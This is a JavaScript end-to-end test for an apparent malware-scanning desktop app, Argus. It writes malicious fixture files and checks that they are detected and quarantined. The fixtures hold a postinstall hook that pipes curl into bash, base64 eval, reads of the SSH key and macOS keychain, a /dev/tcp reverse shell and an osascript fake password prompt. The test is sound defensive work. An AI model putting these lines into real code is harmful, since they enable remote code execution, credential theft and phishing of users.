// End-to-end test for Argus driven through tauri-wd + WebDriver.
// Launches the real Tauri app, adds ~/code/bad as a monitored folder, then
// triggers a scan and asserts that malicious files were detected and
// quarantined.

import os from "node:os";
import path from "node:path";
import fs from "node:fs/promises";
import { Builder, Capabilities } from "selenium-webdriver";

const HOME = os.homedir();
const BAD_DIR = path.join(HOME, "code", "bad");
const WD_SERVER = process.env.TAURI_WD_URL || "http://127.0.0.1:4444";
const BINARY =
  process.env.ARGUS_BIN ||
  path.resolve("src-tauri/target/debug/argus");

function log(...args) {
  console.log("[e2e]", ...args);
}

function assert(cond, msg) {
  if (!cond) {
    console.error("ASSERT FAILED:", msg);
    process.exitCode = 1;
    throw new Error(msg);
  }
}

async function invokeIn(driver, command, args = {}) {
  return driver.executeAsyncScript(
    (cmd, payload, done) => {
      try {
        window.__TAURI__.core
          .invoke(cmd, payload)
          .then((r) => done({ ok: true, value: r }))
          .catch((e) => done({ ok: false, error: String(e) }));
      } catch (e) {
        done({ ok: false, error: String(e) });
      }
    },
    command,
    args
  );
}

async function unwrap(res, label) {
  if (!res || !res.ok) {
    throw new Error(`${label} failed: ${res && res.error}`);
  }
  return res.value;
}

async function resetState() {
  const base = path.join(HOME, ".argus");
  await fs.rm(base, { recursive: true, force: true }).catch(() => {});
  await fs.mkdir(base, { recursive: true });
  // Rehydrate the ~/code/bad fixture in case a prior run quarantined it.
  await fs.mkdir(BAD_DIR, { recursive: true });
  await fs.mkdir(path.join(BAD_DIR, "scripts"), { recursive: true });
  await fs.writeFile(
    path.join(BAD_DIR, "package.json"),
    JSON.stringify(
      {
        name: "fake-interview-task",
        version: "1.0.0",
        scripts: {
          preinstall: "node ./scripts/setup.js",
          postinstall: "curl -fsSL http://185.244.210.99/ti.sh | bash",
        },
        dependencies: { "flatmap-stream": "0.1.1" },
      },
      null,
      2
    )
  );
  await fs.writeFile(
    path.join(BAD_DIR, "scripts/setup.js"),
    `// fixture
const fs = require('fs');
const payload = Buffer.from('Y29uc29sZS5sb2coIm93bmVkIik=', 'base64').toString();
eval(payload);
fs.readFileSync(require('os').homedir() + '/.ssh/id_rsa');
fs.readFileSync(require('os').homedir() + '/Library/Keychains/login.keychain-db');
`
  );
  await fs.writeFile(
    path.join(BAD_DIR, "index.js"),
    `// fixture
const cmd = 'bash -i >& /dev/tcp/185.244.210.99/4444 0>&1';
const phish = \`osascript -e 'display dialog "macOS needs your password" default answer ""'\`;
`
  );
}

async function main() {
  log("resetting Argus state");
  await resetState();

  log("fixture path:", BAD_DIR);
  log("binary path:", BINARY);
  try {
    await fs.access(BINARY);
  } catch {
    throw new Error(`binary not found at ${BINARY}. Run 'cargo build' first.`);
  }

  log("connecting to", WD_SERVER);
  const caps = new Capabilities();
  caps.set("browserName", "tauri");
  caps.set("tauri:options", { binary: BINARY });
  const driver = await new Builder()
    .usingServer(WD_SERVER)
    .forBrowser("tauri")
    .withCapabilities(caps)
    .build();

  const pass = async (name, fn) => {
    try {
      log("TEST:", name);
      await fn();
      log("  PASS:", name);
    } catch (e) {
      console.error("  FAIL:", name, e.message || e);
      process.exitCode = 1;
    }
  };

  try {
    driver.manage().setTimeouts({ script: 30_000 });

    // Tauri apps may need explicit window switch before scripts run.
    for (let i = 0; i < 40; i++) {
      try {
        const handles = await driver.getAllWindowHandles();
        if (handles && handles.length) {
          await driver.switchTo().window(handles[0]);
          log("switched to window", handles[0]);
          break;
        }
      } catch (e) {
        // keep polling while the plugin warms up
      }
      await new Promise((r) => setTimeout(r, 150));
    }

    await pass("app reports version via invoke", async () => {
      const v = await unwrap(await invokeIn(driver, "app_version"), "app_version");
      assert(typeof v === "string" && v.length > 0, `bad version: ${v}`);
    });

    await pass("add monitored folder", async () => {
      await unwrap(
        await invokeIn(driver, "add_folder", { path: BAD_DIR }),
        "add_folder"
      );
      const list = await unwrap(
        await invokeIn(driver, "list_folders"),
        "list_folders"
      );
      assert(list.some((p) => p.endsWith("bad")), `bad folder not present: ${list}`);
    });

    await pass("force-check the fixture files produces Critical detections", async () => {
      const files = [
        path.join(BAD_DIR, "package.json"),
        path.join(BAD_DIR, "scripts/setup.js"),
        path.join(BAD_DIR, "index.js"),
      ];
      for (const f of files) {
        const det = await unwrap(
          await invokeIn(driver, "force_check", { path: f }),
          `force_check ${f}`
        );
        assert(det, `no detection for ${f}`);
        assert(
          det.top_severity === "Critical" || det.top_severity === "High",
          `weak severity ${det.top_severity} for ${f}`
        );
      }
    });

    await pass("quarantine contains the moved files", async () => {
      const q = await unwrap(
        await invokeIn(driver, "list_quarantine"),
        "list_quarantine"
      );
      assert(q.length >= 1, `expected at least one quarantine entry, got ${q.length}`);
      const originals = q.map((e) => e.original_path);
      assert(
        originals.some((p) => p.endsWith("scripts/setup.js")),
        `setup.js not quarantined: ${originals.join(", ")}`
      );
    });

    await pass("dashboard renders quarantine rows", async () => {
      const count = await driver.executeScript(
        "return document.querySelectorAll('[data-testid=quarantine-row]').length"
      );
      assert(count >= 1, `expected DOM quarantine rows, got ${count}`);
    });

    await pass("newly written bad file in monitored folder is detected live", async () => {
      const liveFile = path.join(BAD_DIR, "live-drop.js");
      const payload =
        "// live drop\nconst fs=require('fs');\neval(Buffer.from('Y29uc29sZS5sb2coIm93bmVkIik=','base64').toString());\nfs.readFileSync(require('os').homedir()+'/.ssh/id_rsa');\n";
      await fs.writeFile(liveFile, payload);
      // Give the fs-watcher up to 5s to notice.
      let found = false;
      for (let i = 0; i < 25; i++) {
        const dets = await unwrap(
          await invokeIn(driver, "list_detections"),
          "list_detections"
        );
        if (dets.some((d) => d.path.endsWith("live-drop.js"))) {
          found = true;
          break;
        }
        await new Promise((r) => setTimeout(r, 200));
      }
      // Cleanup whether detected or not (quarantine moves it, but guard).
      try { await fs.unlink(liveFile); } catch {}
      assert(found, "live-drop.js was not detected by the watcher");
    });

    await pass("restore one quarantined item", async () => {
      const q = await unwrap(
        await invokeIn(driver, "list_quarantine"),
        "list_quarantine"
      );
      const target = q.find((e) => e.original_path.endsWith("index.js"));
      if (!target) return; // may have been restored in a previous run
      await unwrap(
        await invokeIn(driver, "restore_quarantine", { id: target.id }),
        "restore_quarantine"
      );
      const after = await unwrap(
        await invokeIn(driver, "list_quarantine"),
        "list_quarantine"
      );
      assert(
        !after.find((e) => e.id === target.id),
        "quarantine entry still present after restore"
      );
    });

    await pass("scan_path on ~/code/bad yields multiple detections", async () => {
      const dets = await unwrap(
        await invokeIn(driver, "scan_path", { path: BAD_DIR }),
        "scan_path"
      );
      // Files may be quarantined already. Accept empty or non-empty.
      assert(Array.isArray(dets), `expected array, got ${typeof dets}`);
    });
  } finally {
    await driver.quit().catch(() => {});
  }

  if (process.exitCode) {
    log("FAILURES present (exit code", process.exitCode, ")");
  } else {
    log("all e2e tests passed");
  }
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
